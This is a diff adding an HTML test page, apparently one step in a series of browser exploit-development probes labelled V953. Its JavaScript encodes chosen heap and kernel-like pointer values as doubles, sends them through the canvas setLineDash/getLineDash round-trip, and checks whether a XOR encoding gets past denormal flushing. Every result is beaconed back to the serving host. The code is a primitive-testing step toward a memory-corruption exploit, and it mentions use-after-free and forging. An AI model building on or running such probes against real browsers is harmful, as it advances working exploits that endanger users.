@@ -1,0 +1,133 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="30;url=/"><title>V953</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div><script>
+// V953 -- XOR ENCODING DAZ BYPASS. No UAF, no forge, cannot crash.
+// Tests whether XOR 0x4000000000000000 promotes denormal heap pointers
+// into normal doubles that survive setLineDash/getLineDash round-trip.
+var PRE='V953',B=1,LOG=document.getElementById('log');
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(tag,d){var s=('000'+B).slice(-3);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+tag+'?d='+encodeURIComponent(String(d==null?'':d))+'&t='+Date.now();
+ Lg(s+' '+tag+' '+d);
+ try{navigator.sendBeacon(path);}catch(e){}
+ try{new Image().src=path;}catch(e){}
+ try{new Image().src=path+'&k=3';}catch(e){}
+}
+var BI=1200;var pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+
+function u64ToF64(hi,lo){
+ var ab=new ArrayBuffer(8);
+ var u32=new Uint32Array(ab);
+ var f64=new Float64Array(ab);
+ u32[0]=lo>>>0; u32[1]=hi>>>0;
+ return f64[0];
+}
+function f64ToHiLo(v){
+ var ab=new ArrayBuffer(8);
+ var f64=new Float64Array(ab);
+ var u32=new Uint32Array(ab);
+ f64[0]=v;
+ return {hi:u32[1]>>>0, lo:u32[0]>>>0};
+}
+function hex8(v){return ('00000000'+(v>>>0).toString(16)).slice(-8);}
+
+bea('BOOT','v953-xor-daz-bypass');
+
+var ctx=document.createElement('canvas').getContext('2d');
+
+// Test patterns: [name, hi32, lo32]
+var tests = [
+ // Controls: normal doubles that MUST survive
+ ['ctrl_1.0',        0x3FF00000, 0x00000000],
+ ['ctrl_8.0',        0x40200000, 0x00000000],
+ ['ctrl_2.0',        0x40000000, 0x00000000],
+ ['ctrl_neg1',       0xBFF00000, 0x00000000],
+
+ // Raw denormal heap pointers: MUST flush (DAZ proof)
+ ['raw_heapA',       0x00000008, 0x67640000],
+ ['raw_heapB',       0x00000008, 0x7F960000],
+ ['raw_low',         0x00000001, 0x00000000],
+ ['raw_page',        0x00000000, 0x00001000],
+
+ // XOR-encoded heap pointers: the test
+ // ptr XOR 0x40000000_00000000 -> sets bit 62 -> normal double exponent
+ ['xor_heapA',       0x40000008, 0x67640000],
+ ['xor_heapB',       0x40000008, 0x7F960000],
+ ['xor_heapC',       0x40000008, 0x00000000],
+ ['xor_heapD',       0x40000010, 0x00000000],
+ ['xor_low',         0x40000001, 0x00000000],
+ ['xor_page',        0x40000000, 0x00001000],
+ ['xor_wkbase',      0x40000002, 0x00000000],
+ ['xor_maxlo',       0x40000000, 0xFFFFFFFF],
+ ['xor_allbits',     0x4000000F, 0xFFFFFFFF],
+ ['xor_kernel',      0x40000080, 0x00000000],
+
+ // NaN payloads (known to survive per V935)
+ ['nan_custom',      0x7FF80001, 0xDEADBEEF],
+ ['nan_quiet',       0x7FF80000, 0x00000001],
+
+ // Negative XOR (bit 63+62 set)
+ ['negxor_heapA',    0xC0000008, 0x67640000],
+];
+
+var results=[];
+bea('PLAN','tests='+tests.length);
+
+for(var t=0;t<tests.length;t++){
+ var name=tests[t][0], hi=tests[t][1], lo=tests[t][2];
+ var inVal=u64ToF64(hi,lo);
+
+ try{ ctx.setLineDash([inVal, inVal]); }catch(e){
+  results.push(name+'=SET_ERR');
+  bea('FAIL-SET',name+'|'+String(e.message||e).slice(0,40));
+  continue;
+ }
+
+ var out;
+ try{ out=ctx.getLineDash(); }catch(e){
+  results.push(name+'=GET_ERR');
+  bea('FAIL-GET',name+'|'+String(e.message||e).slice(0,40));
+  continue;
+ }
+
+ if(!out||out.length<2){
+  results.push(name+'=EMPTY');
+  bea('FAIL-LEN',name+'|len='+(out?out.length:'null'));
+  continue;
+ }
+
+ var outBits=f64ToHiLo(out[0]);
+ var match=(outBits.hi===hi && outBits.lo===lo);
+ var tag=match?'EXACT':'MISS';
+
+ results.push(name+'='+tag);
+ bea('PASS-'+tag, name+'|in='+hex8(hi)+':'+hex8(lo)+'|out='+hex8(outBits.hi)+':'+hex8(outBits.lo));
+}
+
+// Summary
+var exact=0,miss=0;
+for(var i=0;i<results.length;i++){
+ if(results[i].indexOf('EXACT')>=0)exact++;
+ else miss++;
+}
+
+// Key verdict
+var xorA=results.find(function(r){return r.indexOf('xor_heapA')===0;});
+var rawA=results.find(function(r){return r.indexOf('raw_heapA')===0;});
+
+var verdict='UNKNOWN';
+if(xorA&&xorA.indexOf('EXACT')>=0 && rawA&&rawA.indexOf('MISS')>=0){
+ verdict='XOR-BYPASS-CONFIRMED';
+} else if(xorA&&xorA.indexOf('EXACT')>=0){
+ verdict='XOR-SURVIVES-BUT-RAW-ALSO-SURVIVES';
+} else if(xorA&&xorA.indexOf('MISS')>=0){
+ verdict='XOR-DEAD';
+} else {
+ verdict='XOR-ERROR';
+}
+
+bea('VERDICT',verdict+'|exact='+exact+'|miss='+miss+'|xorA='+(xorA||'?')+'|rawA='+(rawA||'?'));
+bea('ALL',results.join('|'));
+
+Lg('\n'+verdict);
+</script></body></html>
